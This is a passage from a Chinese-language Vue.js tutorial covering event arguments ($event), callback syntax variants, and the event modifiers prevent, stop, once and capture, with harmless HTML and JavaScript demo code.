<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params">value,a,b,c,d</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(value,a,b,c,d)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511153131660.png" alt="image-20220511153131660"></p>
<p>发现<code>event</code>并没有获取到</p>
<p><code>vue</code>约定，在页面传参数时，默认在最后一个参数传入关键词<code>$event</code>，就可以获取到<code>event</code>对象了</p>
<p>并且在回调函数中，<code>event</code>参数是紧跟在自定义参数后面的，和怎么写无关：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;showInfo(666, $event)&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span> // 传入关键词$event，就可以在回调函数中获取到event对象</span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params">value,a,b,c,d,$event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(value,a,b,c,d,$event) <span class="comment">// 我想要$event在最后打印，实际上参数a的位置最终打印了event对象，event的顺序和页面定义时传的顺序一致</span></span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511153515558.png" alt="image-20220511153515558"></p>
<h4 id="回调函数的几种写法"><a href="#回调函数的几种写法" class="headerlink" title="回调函数的几种写法"></a>回调函数的几种写法</h4><ul>
<li><p><code>@click=&quot;showInfo&quot;</code></p>
<ul>
<li><p>当没有括号，回调函数指定<code>$event</code>形参时，打印结果是<code>event</code>对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">$event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($event) <span class="comment">// event对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511155011362.png" alt="image-20220511155011362"></p>
</li>
</ul>
</li>
<li><p><code>@click=&quot;showInfo()&quot;</code></p>
<ul>
<li><p>当有括号但没有传递实参，回调函数指定<code>$event</code>形参时，打印结果是<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">$event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($event) <span class="comment">// undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511155142176.png" alt="image-20220511155142176"></p>
</li>
</ul>
</li>
<li><p><code>@click=&quot;showInfo($event)&quot;</code></p>
<ul>
<li><p>当有括号且显示指定<code>$event</code>实参，回调函数指定<code>$event</code>形参时，打印结果是<code>event</code>对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">$event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>($event) <span class="comment">// event对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511155823472.png" alt="image-20220511155823472"></p>
</li>
</ul>
</li>
<li><p><code>@click=&quot;showInfo(666)&quot;</code></p>
<ul>
<li><p>当有括号且指定其他实参，并没有指定<code>$event实参</code>，回调函数的形参除了匹配实参还额外指定<code>$event</code>形参时，<code>event</code>对象会丢失</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">value, $event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value, $event) <span class="comment">// 666 undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511155954592.png" alt="image-20220511155954592"></p>
</li>
</ul>
</li>
<li><p><code>@click=showInfo(666, $event)</code></p>
<ul>
<li><p>当有括号且指定其他实参，并显示指定<code>$event</code>实参，回调函数匹配形参时，可以打印出<code>event</code>对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">value, $event</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value, $event) <span class="comment">// 666 event对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511160133534.png" alt="image-20220511160133534"></p>
</li>
</ul>
</li>
</ul>
<h4 id="回调函数挂载在vm实例对象上"><a href="#回调函数挂载在vm实例对象上" class="headerlink" title="回调函数挂载在vm实例对象上"></a>回调函数挂载在<code>vm</code>实例对象上</h4><p>如图可以看到，回调函数也是在<code>vm</code>上的</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511154034219.png" alt="image-20220511154034219"></p>
<p>不要自作聪明，在<code>data</code>配置项中去写函数，那样的话，<code>vue</code>会给函数写设置数据劫持和数据代理，没有必要</p>
<p>如下是错误的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;showInfo(666, $event)&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params">value, $event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(value, $event)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511154307480.png" alt="image-20220511154307480"></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511154325630.png" alt="image-20220511154325630"></p>
<h3 id="1-8-6-小结：事件处理"><a href="#1-8-6-小结：事件处理" class="headerlink" title="1.8.6.小结：事件处理"></a>1.8.6.小结：事件处理</h3><p>事件的基本使用</p>
<ul>
<li>使用<code>v-on:xxx</code>或<code>@xxx</code>绑定事件，其中<code>xxx</code>为事件名</li>
<li>事件的回调需要配置在<code>methods</code>对象中，最终在<code>vm</code>上</li>
<li><code>methods</code>中配置的函数，不要用箭头函数，否则<code>this</code>的指向就不是<code>vm</code>了</li>
<li><code>methods</code>中配置的函数，都是被<code>vue</code>所管理的函数，<code>this</code>指向<code>vm</code>或组件实例对象</li>
<li><code>@click=&quot;demo&quot;</code>和<code>@click=&quot;demo($event)&quot;</code>效果一致，但后者可以传参</li>
</ul>
<h2 id="1-9-事件修饰符"><a href="#1-9-事件修饰符" class="headerlink" title="1.9.事件修饰符"></a>1.9.事件修饰符</h2><h3 id="1-9-1-prevent"><a href="#1-9-1-prevent" class="headerlink" title="1.9.1.prevent"></a>1.9.1.<code>prevent</code></h3><p>阻止绑定事件的标签上的默认事件</p>
<p>存在默认事件的标签：</p>
<ul>
<li><p><code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;&lt;/a&gt;</code>：默认事件为跳转链接</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点击提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>给<code>a</code>标签绑定点击事件，页面点击时，除了会调用回调函数（打印<code>hello</code>），还会跳转链接（跳转到<code>baidu</code>）</p>
<p>为了阻止<code>a</code>标签点击事件的默认行为，可以调用点击事件<code>event</code>对象的<code>preventDefault</code>方法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">e</span>)&#123;</span><br><span class="line">	e.<span class="title function_">preventDefault</span>() <span class="comment">// 阻止a标签点击事件的默认（跳转）行为</span></span><br><span class="line">	<span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>语法糖：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点击提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-9-2-stop"><a href="#1-9-2-stop" class="headerlink" title="1.9.2.stop"></a>1.9.2.<code>stop</code></h3><p>阻止事件冒泡</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">			<span class="selector-class">.demo</span> &#123;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">				<span class="attribute">background-color</span>: <span class="number">#b3d4fc</span>;</span></span><br><span class="line"><span class="language-css">			&#125;</span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于事件冒泡，<code>click</code>事件的回调函数被执行了两次</p>
<p>阻止事件冒泡：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showInfo</span>(<span class="params">e</span>)&#123;</span><br><span class="line">	e.<span class="title function_">stopPropagation</span>()</span><br><span class="line">	<span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>语法糖：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-9-3-once"><a href="#1-9-3-once" class="headerlink" title="1.9.3.once"></a>1.9.3.<code>once</code></h3><p>事件只触发一次</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click.<span class="property">once</span>=<span class="string">&quot;showInfo&quot;</span>&gt;click&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>页面只会打印一次，第二次以后单击事件就不会调用回调函数了</p>
<h3 id="1-9-4-capture"><a href="#1-9-4-capture" class="headerlink" title="1.9.4.capture"></a>1.9.4.<code>capture</code></h3><p>使用事件的捕获模式</p>
<p>事件的处理默认是在冒泡阶段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">		&lt;script src=&quot;js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">		&lt;style&gt;</span><br><span class="line">			.box1 &#123;</span><br><span class="line">				width: 100%;</span><br><span class="line">				height: 100px;</span><br><span class="line">				background-color: #b3d4fc;</span><br><span class="line">			&#125;</span><br><span class="line">			.box2 &#123;</span><br><span class="line">				width: 100%;</span><br><span class="line">				height: 50px;</span><br><span class="line">				background-color: #e5a4a4;</span><br><span class="line">			&#125;</span><br><span class="line">		&lt;/style&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">		&lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span 